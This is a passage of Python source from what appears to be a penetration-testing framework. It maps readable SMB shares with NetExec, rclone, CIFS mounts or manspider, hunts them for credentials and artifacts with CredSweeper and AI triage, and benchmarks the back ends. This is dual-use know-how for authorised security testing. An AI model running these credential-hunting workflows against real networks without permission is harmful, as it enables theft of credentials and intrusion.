        shell.domains_dir,
        domain,
        shell.smb_dir,
        "rclone",
        "share_tree_map.json",
    )
    marked_rclone_output_rel = mark_sensitive(rclone_output_rel, "path")

    availability = AIBackendAvailabilityService().get_availability()
    selected_method = _select_post_mapping_sensitive_data_method(
        shell=shell,
        ai_configured=availability.configured,
        domain=domain,
        username=username,
        password=password,
    )
    if selected_method is None:
        print_info("SMB sensitive-data analysis skipped by user.")
        return

    if shell.auto:
        selected_method = _resolve_default_deterministic_share_analysis_method(
            shell,
            domain=domain,
            username=username,
            password=password,
        )

    if selected_method in {
        "deterministic_rclone_direct",
        "deterministic_rclone_mapped",
        "deterministic_cifs",
        "deterministic_manspider",
    }:
        workspace_cwd = shell._get_workspace_cwd()
        _run_post_mapping_sensitive_data_workflow(
            shell,
            domain=domain,
            aggregate_map_abs=domain_path(
                workspace_cwd,
                shell.domains_dir,
                domain,
                shell.smb_dir,
                "spider_plus",
                "share_tree_map.json",
            ),
            aggregate_map_rel=output_rel,
            shares=shares,
            hosts=hosts,
            share_map=share_map,
            triage_username=username,
            triage_password=password,
            selected_method=selected_method,
            cifs_mount_root=_resolve_cifs_mount_root(shell=shell, domain=domain),
        )
        return

    if selected_method == "ai":
        if not confirm_operation(
            operation_name="SMB Share Tree Mapping (spider_plus + AI)",
            description=(
                "Builds a reusable SMB share tree map using NetExec spider_plus "
                "(metadata only, no file download), then runs AI triage."
            ),
            context={
                "Domain": domain,
                "PDC": pdc,
                "Username": username,
                "Readable Shares": str(num_shares),
                "Hosts": str(num_hosts),
                "Output": marked_output_rel,
                "Download Files": "No (DOWNLOAD_FLAG=False)",
            },
            default=True,
            icon="🗺️",
            show_panel=True,
        ):
            return
        run_smb_share_tree_mapping_with_spider_plus(
            shell,
            domain=domain,
            shares=shares,
            username=username,
            password=password,
            hosts=hosts,
            share_map=share_map,
            selected_method="ai",
        )
        return

    if selected_method == "ai_cifs":
        mount_root = _resolve_cifs_mount_root(shell=shell, domain=domain)
        marked_mount_root = mark_sensitive(mount_root, "path")
        if not confirm_operation(
            operation_name="SMB Share Tree Mapping (CIFS + AI)",
            description=(
                "Builds SMB share tree metadata from local CIFS mounts, then runs "
                "AI triage over the consolidated mapping."
            ),
            context={
                "Domain": domain,
                "PDC": pdc,
                "Username": username,
                "Readable Shares": str(num_shares),
                "Hosts": str(num_hosts),
                "CIFS Mount Root": marked_mount_root,
                "Output": marked_cifs_output_rel,
            },
            default=True,
            icon="🗺️",
            show_panel=True,
        ):
            return
        run_smb_share_tree_mapping_with_cifs(
            shell,
            domain=domain,
            shares=shares,
            username=username,
            password=password,
            hosts=hosts,
            share_map=share_map,
            cifs_mount_root=mount_root,
            selected_method="ai_cifs",
        )
        return

    if selected_method == "ai_rclone":
        if not confirm_operation(
            operation_name="SMB Share Tree Mapping (rclone + AI)",
            description=(
                "Builds SMB share tree metadata with rclone lsjson over SMB, then "
                "runs AI triage over the consolidated mapping."
            ),
            context={
                "Domain": domain,
                "PDC": pdc,
                "Username": username,
                "Readable Shares": str(num_shares),
                "Hosts": str(num_hosts),
                "Output": marked_rclone_output_rel,
            },
            default=True,
            icon="🗺️",
            show_panel=True,
        ):
            return
        run_smb_share_tree_mapping_with_rclone(
            shell,
            domain=domain,
            shares=shares,
            username=username,
            password=password,
            hosts=hosts,
            share_map=share_map,
            selected_method="ai_rclone",
        )
        return


def _enumerate_readable_share_context_for_mapping(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> tuple[list[str], list[str], dict[str, dict[str, str]]]:
    """Enumerate readable SMB shares and hosts for mapping workflows."""
    if not shell.netexec_path:
        return [], [], {}

    auth_args = _build_spider_plus_auth(
        shell,
        domain=domain,
        username=username,
        password=password,
    )
    workspace_dir = getattr(shell, "current_workspace_dir", None) or os.getcwd()
    enabled_computers, _ = ensure_enabled_computer_ip_file(
        workspace_dir,
        shell.domains_dir,
        domain,
        shell.domains_data.get(domain, {}),
    )
    smb_ips = domain_relpath(shell.domains_dir, domain, "smb", "ips.txt")
    target_path = enabled_computers if enabled_computers else smb_ips
    command = (
        f"{shell.netexec_path} smb {shlex.quote(target_path)} {auth_args} --smb-timeout 30 --shares"
    )
    completed_process = shell._run_netexec(
        command,
        domain=domain,
        timeout=1200,
        pre_sync=False,
    )
    if completed_process is None:
        return [], [], {}

    output_text = str(getattr(completed_process, "stdout", "") or "")
    share_map = parse_smb_share_map(output_text)
    read_shares, _write_shares, read_hosts, _write_hosts = summarize_share_map(
        share_map
    )
    read_shares = _filter_shares_by_global_mapping_exclusions(read_shares)
    share_map = _filter_share_map_by_global_mapping_exclusions(share_map) or {}
    ordered_hosts = sorted(read_hosts)
    return read_shares, ordered_hosts, share_map


def _resolve_smb_map_benchmark_credential(
    *,
    shell: Any,
    domain: str,
    credential_username: str | None,
) -> tuple[str, str] | None:
    """Resolve benchmark credential from active domain state or stored credentials."""
    domain_data = shell.domains_data.get(domain, {}) or {}
    active_username = str(domain_data.get("username", "") or "").strip()
    active_password = str(domain_data.get("password", "") or "").strip()
    requested_user = str(credential_username or "").strip()
    marked_domain = mark_sensitive(domain, "domain")

    if requested_user:
        requested_casefold = requested_user.casefold()
        credentials = domain_data.get("credentials", {})
        if isinstance(credentials, dict):
            for stored_username, stored_secret in credentials.items():
                candidate_username = str(stored_username or "").strip()
                candidate_secret = str(stored_secret or "").strip()
                if not candidate_username:
                    continue
                if candidate_username.casefold() != requested_casefold:
                    continue
                if not candidate_secret:
                    break
                print_info_debug(
                    "SMB benchmark credential override selected: "
                    f"domain={marked_domain} "
                    f"user={mark_sensitive(candidate_username, 'user')}"
                )
                return candidate_username, candidate_secret

        if (
            active_username
            and active_password
            and active_username.casefold() == requested_casefold
        ):
            print_info_debug(
                "SMB benchmark credential override matched active credential: "
                f"domain={marked_domain} "
                f"user={mark_sensitive(active_username, 'user')}"
            )
            return active_username, active_password

        marked_requested = mark_sensitive(requested_user, "user")
        print_error(
            "Requested benchmark credential user "
            f"{marked_requested} was not found for domain {marked_domain}."
        )
        print_instruction(
            "Use `creds show` to list stored credentials, "
            "or run without credential_username to use the active credential."
        )
        return None

    if active_username and active_password:
        return active_username, active_password

    print_error(
        f"No active credentials found for domain {marked_domain}. "
        "Set credentials first and retry."
    )
    return None


def run_smb_map_benchmark(
    shell: Any,
    *,
    domain: str,
    credential_username: str | None = None,
) -> None:
    """Benchmark SMB mapping backends (spider_plus, rclone, and CIFS)."""
    if domain not in getattr(shell, "domains_data", {}):
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            f"Domain {marked_domain} is not configured in the current workspace."
        )
        return

    resolved_credential = _resolve_smb_map_benchmark_credential(
        shell=shell,
        domain=domain,
        credential_username=credential_username,
    )
    if resolved_credential is None:
        return
    username, password = resolved_credential

    shares, hosts, share_map = _enumerate_readable_share_context_for_mapping(
        shell,
        domain=domain,
        username=username,
        password=password,
    )
    if not shares or not hosts:
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(
            "Benchmark aborted: no readable SMB shares/hosts were discovered for "
            f"{marked_domain}."
        )
        return

    options = [
        "NetExec spider_plus mapping",
        "rclone SMB mapping",
        "CIFS local mapping",
    ]
    selected_labels: list[str] | None
    checkbox = getattr(shell, "_questionary_checkbox", None)
    if callable(checkbox):
        selected_labels = checkbox(
            "Select SMB mapping methods to benchmark:",
            options,
        )
    else:
        selected_labels = options

    if selected_labels is None:
        print_info("SMB mapping benchmark cancelled by user.")
        return

    selected_methods: list[str] = []
    if "NetExec spider_plus mapping" in selected_labels:
        selected_methods.append("spider_plus")
    if "rclone SMB mapping" in selected_labels:
        selected_methods.append("rclone")
    if "CIFS local mapping" in selected_labels:
        selected_methods.append("cifs")
    if not selected_methods:
        print_info("No SMB mapping method selected for benchmark.")
        return

    marked_domain = mark_sensitive(domain, "domain")
    marked_user = mark_sensitive(username, "user")
    print_operation_header(
        "SMB Mapping Benchmark",
        details={
            "Domain": marked_domain,
            "Principal": marked_user,
            "Hosts": str(len(hosts)),
            "Readable Shares": str(len(shares)),
            "Selected Methods": str(len(selected_methods)),
        },
        icon="⏱️",
    )

    results: list[dict[str, Any]] = []
    for method in selected_methods:
        started = time.perf_counter()
        label = method
        try:
            if method == "spider_plus":
                success = run_smb_share_tree_mapping_with_spider_plus(
                    shell,
                    domain=domain,
                    shares=shares,
                    username=username,
                    password=password,
                    hosts=hosts,
                    share_map=share_map,
                    selected_method="deterministic",
                    run_post_mapping_workflow=False,
                )
                label = "NetExec spider_plus"
            elif method == "rclone":
                success = run_smb_share_tree_mapping_with_rclone(
                    shell,
                    domain=domain,
                    shares=shares,
                    username=username,
                    password=password,
                    hosts=hosts,
                    share_map=share_map,
                    selected_method="deterministic",
                    run_post_mapping_workflow=False,
                )
                label = "rclone SMB"
            elif method == "cifs":
                success = run_smb_share_tree_mapping_with_cifs(
                    shell,
                    domain=domain,
                    shares=shares,
                    username=username,
                    password=password,
                    hosts=hosts,
                    share_map=share_map,
                    cifs_mount_root=_resolve_cifs_mount_root(
                        shell=shell, domain=domain
                    ),
                    selected_method="deterministic",
                    run_post_mapping_workflow=False,
                )
                label = "CIFS local"
            else:
                continue
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_warning(
                f"SMB mapping benchmark backend {label} failed unexpectedly."
            )
            print_warning_debug(
                f"Benchmark backend failure: method={label} "
                f"type={type(exc).__name__} error={exc}"
            )
            print_warning_debug(traceback.format_exc())
            success = False

        elapsed_seconds = max(0.0, time.perf_counter() - started)
        results.append(
            {
                "method": label,
                "success": bool(success),
                "duration_seconds": elapsed_seconds,
            }
        )

    if not results:
        print_warning("SMB mapping benchmark completed with no executed methods.")
        return

    table = Table(
        title="[bold cyan]SMB Mapping Benchmark Results[/bold cyan]",
        header_style="bold magenta",
        box=rich.box.SIMPLE_HEAVY,
    )
    table.add_column("Method", style="cyan")
    table.add_column("Status", style="magenta")
    table.add_column("Duration (s)", style="green", justify="right")
    for result in results:
        status = "ok" if result["success"] else "failed"
        table.add_row(
            str(result["method"]),
            status,
            f"{float(result['duration_seconds']):.3f}",
        )

    print_panel_with_table(table, border_style=BRAND_COLORS["info"])
    _persist_smb_mapping_benchmark_results(
        shell=shell,
        domain=domain,
        username=username,
        shares_count=len(shares),
        hosts_count=len(hosts),
        selected_methods=selected_methods,
        results=results,
    )


@dataclass(frozen=True)
class SMBSensitiveBenchmarkScenario:
    """One executable SMB sensitive-data benchmark scenario."""

    label: str
    backend: str
    benchmark_kind: str
    benchmark_scope: str
    benchmark_execution_mode: str
    mapping_mode: str
    read_mode: str


def run_smb_sensitive_benchmark(
    shell: Any,
    *,
    domain: str,
    credential_username: str | None = None,
) -> None:
    """Benchmark deterministic SMB sensitive-data backends."""
    if domain not in getattr(shell, "domains_data", {}):
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            f"Domain {marked_domain} is not configured in the current workspace."
        )
        return

    resolved_credential = _resolve_smb_map_benchmark_credential(
        shell=shell,
        domain=domain,
        credential_username=credential_username,
    )
    if resolved_credential is None:
        return
    username, password = resolved_credential

    shares, hosts, share_map = _enumerate_readable_share_context_for_mapping(
        shell,
        domain=domain,
        username=username,
        password=password,
    )
    if not shares or not hosts:
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(
            "Benchmark aborted: no readable SMB shares/hosts were discovered for "
            f"{marked_domain}."
        )
        return
    benchmark_kind, benchmark_scope, benchmark_execution_mode = (
        _select_smb_sensitive_benchmark_mode(shell=shell)
    )
    selected_backends = _select_smb_sensitive_benchmark_backends(shell=shell)
    if not selected_backends:
        print_info("No deterministic SMB sensitive-data backend selected.")
        return

    mapping_modes_by_backend: dict[str, list[str]] = {}
    cifs_read_modes: list[str] = []
    rclone_read_modes: list[str] = []
    if "cifs" in selected_backends:
        mapping_modes_by_backend["cifs"] = _select_smb_sensitive_benchmark_mapping_modes(
            shell=shell,
            backend="cifs",
        )
        cifs_read_modes = _select_smb_sensitive_benchmark_cifs_read_modes(shell=shell)
    if "rclone" in selected_backends:
        mapping_modes_by_backend["rclone"] = _select_smb_sensitive_benchmark_mapping_modes(
            shell=shell,
            backend="rclone",
        )
        rclone_read_modes = _select_smb_sensitive_benchmark_rclone_read_modes(
            shell=shell,
            benchmark_kind=benchmark_kind,
        )

    scenarios = _build_smb_sensitive_benchmark_scenarios(
        benchmark_kind=benchmark_kind,
        benchmark_scope=benchmark_scope,
        benchmark_execution_mode=benchmark_execution_mode,
        selected_backends=selected_backends,
        mapping_modes_by_backend=mapping_modes_by_backend,
        cifs_read_modes=cifs_read_modes,
        rclone_read_modes=rclone_read_modes,
    )
    if not scenarios:
        print_warning("No valid SMB sensitive-data benchmark scenario could be built.")
        return

    selected_methods = [scenario.label for scenario in scenarios]
    scope_label_map = {
        SMB_SENSITIVE_BENCHMARK_SCOPE_TEXT_ONLY: "Text files only",
        SMB_SENSITIVE_BENCHMARK_SCOPE_BINARY_ONLY: "Document-like binaries only",
        SMB_SENSITIVE_BENCHMARK_SCOPE_ALL_SUPPORTED: (
            "All CredSweeper-supported files"
        ),
        SMB_SENSITIVE_BENCHMARK_SCOPE_DOCUMENTS_DEPTH_EXPERIMENTAL: (
            "Documents with --doc --depth (experimental)"
        ),
        "specialized_artifacts": "Specialized artifacts",
    }

    marked_domain = mark_sensitive(domain, "domain")
    marked_user = mark_sensitive(username, "user")
    print_operation_header(
        "SMB Sensitive-Data Benchmark",
        details={
            "Domain": marked_domain,
            "Principal": marked_user,
            "Hosts": str(len(hosts)),
            "Readable Shares": str(len(shares)),
            "Benchmark Type": (
                "Artifacts"
                if benchmark_kind == "artifacts"
                else "Full production-like"
                if benchmark_kind == "full"
                else "Credentials"
            ),
            "Selected Scenarios": str(len(scenarios)),
            "Content Scope": scope_label_map.get(benchmark_scope, benchmark_scope),
            "Execution Mode": (
                "Production-sequenced"
                if benchmark_execution_mode == "production_sequenced"
                else "Combined throughput"
                if benchmark_execution_mode == "combined_throughput"
                else "Single phase"
            ),
        },
        icon="⏱️",
    )

    results: list[dict[str, Any]] = []
    for scenario in scenarios:
        started = time.perf_counter()
        label = scenario.label
        try:
            benchmark_result = _run_smb_sensitive_benchmark_scenario(
                shell=shell,
                domain=domain,
                shares=shares,
                hosts=hosts,
                username=username,
                password=password,
                share_map=share_map,
                scenario=scenario,
            )
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_warning(
                f"SMB sensitive-data benchmark backend {label} failed unexpectedly."
            )
            print_warning_debug(
                f"Sensitive benchmark backend failure: method={label} "
                f"type={type(exc).__name__} error={exc}"
            )
            print_warning_debug(traceback.format_exc())
            benchmark_result = {
                "success": False,
                "candidate_files": 0,
                "scanned_files": 0,
                "files_with_findings": 0,
                "credential_like_findings": 0,
                "artifact_hits": 0,
                "mapped_shares": 0,
                "mapping_seconds": 0.0,
                "text_prepare_seconds": 0.0,
                "text_analysis_seconds": 0.0,
                "document_prepare_seconds": 0.0,
                "document_analysis_seconds": 0.0,
                "artifact_prepare_seconds": 0.0,
                "artifact_analysis_seconds": 0.0,
                "credential_preview_values": [],
                "artifact_preview_values": [],
            }

        elapsed_seconds = max(0.0, time.perf_counter() - started)
        mapping_seconds = max(
            0.0,
            float(benchmark_result.get("mapping_seconds", 0.0) or 0.0),
        )
        mapping_seconds = min(mapping_seconds, elapsed_seconds)
        post_mapping_seconds = max(0.0, elapsed_seconds - mapping_seconds)
        results.append(
            {
                "method": label,
                "success": bool(benchmark_result.get("success")),
                "duration_seconds": elapsed_seconds,
                "mapping_seconds": mapping_seconds,
                "post_mapping_seconds": post_mapping_seconds,
                "candidate_files": int(benchmark_result.get("candidate_files", 0) or 0),
                "scanned_files": int(benchmark_result.get("scanned_files", 0) or 0),
                "files_with_findings": int(
                    benchmark_result.get("files_with_findings", 0) or 0
                ),
                "credential_like_findings": int(
                    benchmark_result.get("credential_like_findings", 0) or 0
                ),
                "artifact_hits": int(benchmark_result.get("artifact_hits", 0) or 0),
                "mapped_shares": int(benchmark_result.get("mapped_shares", 0) or 0),
                "text_phase_seconds": float(
                    benchmark_result.get("text_phase_seconds", 0.0) or 0.0
                ),
                "document_phase_seconds": float(
                    benchmark_result.get("document_phase_seconds", 0.0) or 0.0
                ),
                "artifact_phase_seconds": float(
                    benchmark_result.get("artifact_phase_seconds", 0.0) or 0.0
                ),
                "text_prepare_seconds": float(
                    benchmark_result.get("text_prepare_seconds", 0.0) or 0.0
                ),
                "text_analysis_seconds": float(
                    benchmark_result.get("text_analysis_seconds", 0.0) or 0.0
                ),
                "document_prepare_seconds": float(
                    benchmark_result.get("document_prepare_seconds", 0.0) or 0.0
                ),
                "document_analysis_seconds": float(
                    benchmark_result.get("document_analysis_seconds", 0.0) or 0.0
                ),
                "artifact_prepare_seconds": float(
                    benchmark_result.get("artifact_prepare_seconds", 0.0) or 0.0
                ),
                "artifact_analysis_seconds": float(
                    benchmark_result.get("artifact_analysis_seconds", 0.0) or 0.0
                ),
                "credential_preview_values": list(
                    benchmark_result.get("credential_preview_values", []) or []
                ),
                "artifact_preview_values": list(
                    benchmark_result.get("artifact_preview_values", []) or []
                ),
            }
        )

    if not results:
        print_warning("SMB sensitive-data benchmark completed with no executed methods.")
        return

    table = _build_smb_sensitive_benchmark_results_table(
        results=results,
        benchmark_kind=benchmark_kind,
    )

    print_panel_with_table(table, border_style=BRAND_COLORS["info"])
    if benchmark_kind == "full":
        print_panel_with_table(
            _build_smb_sensitive_benchmark_phase_breakdown_table(results=results),
            border_style=BRAND_COLORS["info"],
        )
    _persist_smb_sensitive_benchmark_results(
        shell=shell,
        domain=domain,
        username=username,
        shares_count=len(shares),
        hosts_count=len(hosts),
        selected_methods=selected_methods,
        benchmark_kind=benchmark_kind,
        benchmark_scope=benchmark_scope,
        benchmark_execution_mode=benchmark_execution_mode,
        results=results,
    )


def _select_smb_sensitive_benchmark_mode(shell: Any) -> tuple[str, str, str]:
    """Select the high-level benchmark mode."""
    selector = getattr(shell, "_questionary_select", None)
    if not callable(selector):
        return ("full", SMB_SENSITIVE_BENCHMARK_SCOPE_ALL_SUPPORTED, "production_sequenced")
    selected = selector(
        "Select SMB sensitive-data benchmark mode:",
        [
            "Text credentials only",
            "Document credentials only",
            "Artifacts only",
            "Full production-like (text + docs + artifacts)",
            "Documents with --doc --depth (experimental)",
        ],
        default_idx=3,
    )
    if selected == 0:
        return ("credentials", SMB_SENSITIVE_BENCHMARK_SCOPE_TEXT_ONLY, "single_phase")
    if selected == 1:
        return ("credentials", SMB_SENSITIVE_BENCHMARK_SCOPE_BINARY_ONLY, "single_phase")
    if selected == 2:
        return ("artifacts", "specialized_artifacts", "single_phase")
    if selected == 4:
        return (
            "credentials",
            SMB_SENSITIVE_BENCHMARK_SCOPE_DOCUMENTS_DEPTH_EXPERIMENTAL,
            "single_phase",
        )
    return ("full", SMB_SENSITIVE_BENCHMARK_SCOPE_ALL_SUPPORTED, "production_sequenced")


def _select_smb_sensitive_benchmark_backends(shell: Any) -> list[str]:
    """Select benchmark backends."""
    checkbox = getattr(shell, "_questionary_checkbox", None)
    options = ["manspider", "cifs", "rclone"]
    if not callable(checkbox):
        return list(options)
    selected = checkbox(
        "Select SMB sensitive-data benchmark backends:",
        ["manspider", "CIFS", "rclone"],
    )
    if selected is None:
        return []
    normalized: list[str] = []
    if "manspider" in selected:
        normalized.append("manspider")
    if "CIFS" in selected:
        normalized.append("cifs")
    if "rclone" in selected:
        normalized.append("rclone")
    return normalized


def _select_smb_sensitive_benchmark_mapping_modes(
    shell: Any,
    *,
    backend: str,
) -> list[str]:
    """Select whether a backend should benchmark mapped, non-mapped, or both modes."""
    if backend == "manspider":
        return ["native"]
    selector = getattr(shell, "_questionary_select", None)
    if not callable(selector):
        return ["direct", "mapped"]
    selected = selector(
        f"Select mapping mode for {backend}:",
        [
            "Without prior mapping",
            "With prior mapping",
            "Both",
        ],
        default_idx=2,
    )
    if selected == 0:
        return ["direct"]
    if selected == 1:
        return ["mapped"]
    return ["direct", "mapped"]


def _select_smb_sensitive_benchmark_cifs_read_modes(shell: Any) -> list[str]:
    """Select CIFS read modes for the benchmark."""
    selector = getattr(shell, "_questionary_select", None)
    if not callable(selector):
        return ["candidate_paths", "full_mount"]
    selected = selector(
        "Select CIFS read mode(s):",
        [
            "Candidate paths only",
            "Full mount only",
            "Both",
        ],
        default_idx=2,
    )
    if selected == 0:
        return ["candidate_paths"]
    if selected == 1:
        return ["full_mount"]
    return ["candidate_paths", "full_mount"]


def _select_smb_sensitive_benchmark_rclone_read_modes(
    shell: Any,
    *,
    benchmark_kind: str,
) -> list[str]:
    """Select rclone read modes for the benchmark."""
    selector = getattr(shell, "_questionary_select", None)
    if benchmark_kind == "artifacts":
        return ["copy"]
    if not callable(selector):
        return ["copy", "cat_library"]
    options = [
        "copy only",
        (
            "cat + CredSweeper library only"
            if benchmark_kind != "full"
            else "cat + CredSweeper library (artifacts fallback to copy)"
        ),
        "Both",
    ]
    selected = selector(
        "Select rclone read mode(s):",
        options,
        default_idx=2,
    )
    if selected == 0:
        return ["copy"]
    if selected == 1:
        return ["cat_library"]
    return ["copy", "cat_library"]


def _build_smb_sensitive_benchmark_scenarios(
    *,
    benchmark_kind: str,
    benchmark_scope: str,
    benchmark_execution_mode: str,
    selected_backends: list[str],
    mapping_modes_by_backend: dict[str, list[str]],
    cifs_read_modes: list[str],
    rclone_read_modes: list[str],
) -> list[SMBSensitiveBenchmarkScenario]:
    """Build executable benchmark scenarios from UX selections."""
    scenarios: list[SMBSensitiveBenchmarkScenario] = []
    if "manspider" in selected_backends:
        scenarios.append(
            SMBSensitiveBenchmarkScenario(
                label="Legacy manspider download",
                backend="manspider",
                benchmark_kind=benchmark_kind,
                benchmark_scope=benchmark_scope,
                benchmark_execution_mode=benchmark_execution_mode,
                mapping_mode="native",
                read_mode="download",
            )
        )

    for mapping_mode in mapping_modes_by_backend.get("cifs", []):
        for read_mode in cifs_read_modes or ["candidate_paths"]:
            effective_mapping_mode = mapping_mode
            if read_mode == "full_mount" and mapping_mode == "mapped":
                print_warning(
                    "CIFS full mount scans the mounted tree directly. "
                    "Using no-mapping mode for that scenario."
                )
                effective_mapping_mode = "direct"
            scenarios.append(
                SMBSensitiveBenchmarkScenario(
                    label=_build_smb_sensitive_benchmark_scenario_label(
                        backend="cifs",
                        read_mode=read_mode,
                        mapping_mode=effective_mapping_mode,
                        benchmark_kind=benchmark_kind,
                    ),
                    backend="cifs",
                    benchmark_kind=benchmark_kind,
                    benchmark_scope=benchmark_scope,
                    benchmark_execution_mode=benchmark_execution_mode,
                    mapping_mode=effective_mapping_mode,
                    read_mode=read_mode,
                )
            )

    for mapping_mode in mapping_modes_by_backend.get("rclone", []):
        for read_mode in rclone_read_modes or ["copy"]:
            effective_mapping_mode = mapping_mode
            if read_mode == "cat_library" and mapping_mode == "direct":
                print_warning(
                    "rclone cat + CredSweeper library requires prior mapping. "
                    "Using mapped mode for that scenario."
                )
                effective_mapping_mode = "mapped"
            scenarios.append(
                SMBSensitiveBenchmarkScenario(
                    label=_build_smb_sensitive_benchmark_scenario_label(
                        backend="rclone",
                        read_mode=read_mode,
                        mapping_mode=effective_mapping_mode,
                        benchmark_kind=benchmark_kind,
                    ),
                    backend="rclone",
                    benchmark_kind=benchmark_kind,
                    benchmark_scope=benchmark_scope,
                    benchmark_execution_mode=benchmark_execution_mode,
                    mapping_mode=effective_mapping_mode,
                    read_mode=read_mode,
                )
            )

    deduped: list[SMBSensitiveBenchmarkScenario] = []
    seen: set[tuple[str, str, str, str]] = set()
    for scenario in scenarios:
        key = (
            scenario.backend,
            scenario.benchmark_kind,
            scenario.mapping_mode,
            scenario.read_mode,
        )
        if key in seen:
            continue
        seen.add(key)
        deduped.append(scenario)
    return deduped


def _build_smb_sensitive_benchmark_scenario_label(
    *,
    backend: str,
    read_mode: str,
    mapping_mode: str,
    benchmark_kind: str,
) -> str:
    """Render one stable scenario label for tables/history."""
    backend_label = {
        "manspider": "Legacy manspider",
        "cifs": "CIFS",
        "rclone": "rclone",
    }.get(backend, backend)
    read_label = {
        "download": "download",
        "candidate_paths": "candidate paths",
        "full_mount": "full mount",
        "copy": "copy",
        "cat_library": (
            "cat + library"
            if benchmark_kind != "full"
            else "cat + library + copy fallback"
        ),
    }.get(read_mode, read_mode)
    mapping_label = {
        "native": "",
        "direct": "no mapping",
        "mapped": "mapped",
    }.get(mapping_mode, mapping_mode)
    parts = [backend_label, read_label]
    if mapping_label:
        parts.append(mapping_label)
    return " | ".join(parts)


def _select_smb_sensitive_benchmark_kind(shell: Any) -> str:
    """Select whether the benchmark targets credentials or specialized artifacts."""
    selector = getattr(shell, "_questionary_select", None)
    if not callable(selector):
        return "credentials"
    selected = selector(
        "Select SMB sensitive-data benchmark type:",
        [
            "Credential benchmark (CredSweeper)",
            "Artifact benchmark (specialized parsers)",
            "Full production-like benchmark",
        ],
        default_idx=0,
    )
    if selected == 1:
        return "artifacts"
    if selected == 2:
        return "full"
    return "credentials"


def _select_smb_sensitive_benchmark_scope(
    shell: Any,
    *,
    benchmark_kind: str,
) -> str:
    """Select one benchmark content scope for CredSweeper-backed methods."""
    if benchmark_kind == "artifacts":
        return "specialized_artifacts"
    if benchmark_kind == "full":
        return SMB_SENSITIVE_BENCHMARK_SCOPE_ALL_SUPPORTED
    selector = getattr(shell, "_questionary_select", None)
    if not callable(selector):
        return SMB_SENSITIVE_BENCHMARK_SCOPE_TEXT_ONLY
    selected = selector(
        "Select SMB sensitive-data benchmark content scope:",
        [
            "Text files only (current benchmark)",
            "Document-like binaries only (pdf/docx/xlsx...)",
            "All CredSweeper-supported files",
            "Documents with --doc --depth (experimental)",
        ],
        default_idx=0,
    )
    if selected == 1:
        return SMB_SENSITIVE_BENCHMARK_SCOPE_BINARY_ONLY
    if selected == 2:
        return SMB_SENSITIVE_BENCHMARK_SCOPE_ALL_SUPPORTED
    if selected == 3:
        return SMB_SENSITIVE_BENCHMARK_SCOPE_DOCUMENTS_DEPTH_EXPERIMENTAL
    return SMB_SENSITIVE_BENCHMARK_SCOPE_TEXT_ONLY


def _select_smb_sensitive_benchmark_execution_mode(
    shell: Any,
    *,
    benchmark_kind: str,
    benchmark_scope: str,
) -> str:
    """Select execution mode for credential benchmarking."""
    if benchmark_kind == "full":
        return "production_sequenced"
    if benchmark_kind != "credentials":
        return "single_phase"
    if benchmark_scope != SMB_SENSITIVE_BENCHMARK_SCOPE_ALL_SUPPORTED:
        return "single_phase"
    selector = getattr(shell, "_questionary_select", None)
    if not callable(selector):
        return "production_sequenced"
    selected = selector(
        "Select credential benchmark execution mode:",
        [
            "Production-sequenced (Recommended)",
            "Combined throughput",
        ],
        default_idx=0,
    )
    if selected == 1:
        return "combined_throughput"
    return "production_sequenced"


def _build_smb_sensitive_benchmark_results_table(
    *,
    results: list[dict[str, Any]],
    benchmark_kind: str,
) -> Table:
    """Build a benchmark summary table for credential or artifact modes."""
    show_mapping_breakdown = any(
        float(result.get("mapping_seconds", 0.0) or 0.0) > 0.0 for result in results
    )
    table = Table(
        title="[bold cyan]SMB Sensitive-Data Benchmark Results[/bold cyan]",
        header_style="bold magenta",
        box=rich.box.SIMPLE_HEAVY,
    )
    table.add_column("Method", style="cyan")
    table.add_column("Status", style="magenta")
    table.add_column("Total (s)", style="green", justify="right")
    if show_mapping_breakdown:
        table.add_column("Mapping (s)", style="green", justify="right")
        table.add_column("Post-map (s)", style="green", justify="right")
    table.add_column("Candidates", style="white", justify="right")

    if benchmark_kind == "full":
        table.add_column("Scanned", style="white", justify="right")
        table.add_column("Text (s)", style="green", justify="right")
        table.add_column("Docs (s)", style="green", justify="right")
        table.add_column("Artifacts (s)", style="green", justify="right")
        table.add_column("Cred Findings", style="yellow", justify="right")
        table.add_column("Artifact Hits", style="yellow", justify="right")
        table.add_column("Credential Preview", style="white", overflow="fold")
        table.add_column("Artifact Preview", style="white", overflow="fold")
        for result in results:
            row = [
                str(result["method"]),
                "ok" if result["success"] else "failed",
                f"{float(result['duration_seconds']):.3f}",
            ]
            if show_mapping_breakdown:
                mapping_seconds = float(result.get("mapping_seconds", 0.0) or 0.0)
                post_mapping_seconds = float(
                    result.get("post_mapping_seconds", 0.0) or 0.0
                )
                if mapping_seconds > 0.0:
                    row.extend(
                        [
                            f"{mapping_seconds:.3f}",
                            f"{post_mapping_seconds:.3f}",
                        ]
                    )
                else:
                    row.extend(["-", "-"])
            row.extend(
                [
                    str(int(result["candidate_files"])),
                    str(int(result["scanned_files"])),
                    f"{float(result.get('text_phase_seconds', 0.0) or 0.0):.3f}",
                    f"{float(result.get('document_phase_seconds', 0.0) or 0.0):.3f}",
                    f"{float(result.get('artifact_phase_seconds', 0.0) or 0.0):.3f}",
                    str(int(result.get("credential_like_findings", 0))),
                    str(int(result.get("artifact_hits", 0))),
                    _render_credential_preview_cell(
                        list(result.get("credential_preview_values", []) or [])
                    ),
                    _render_artifact_preview_cell(
                        list(result.get("artifact_preview_values", []) or [])
                    ),
                ]
            )
            table.add_row(*row)
        return table

    if benchmark_kind == "artifacts":
        table.add_column("Processed", style="white", justify="right")
        table.add_column("Prep (s)", style="green", justify="right")
        table.add_column("Analysis (s)", style="green", justify="right")
        table.add_column("Artifact Hits", style="yellow", justify="right")
        table.add_column("Artifact Preview", style="white", overflow="fold")
        for result in results:
            row = [
                str(result["method"]),
                "ok" if result["success"] else "failed",
                f"{float(result['duration_seconds']):.3f}",
            ]
            if show_mapping_breakdown:
                mapping_seconds = float(result.get("mapping_seconds", 0.0) or 0.0)
                post_mapping_seconds = float(
                    result.get("post_mapping_seconds", 0.0) or 0.0
                )
                if mapping_seconds > 0.0:
                    row.extend(
                        [
                            f"{mapping_seconds:.3f}",
                            f"{post_mapping_seconds:.3f}",
                        ]
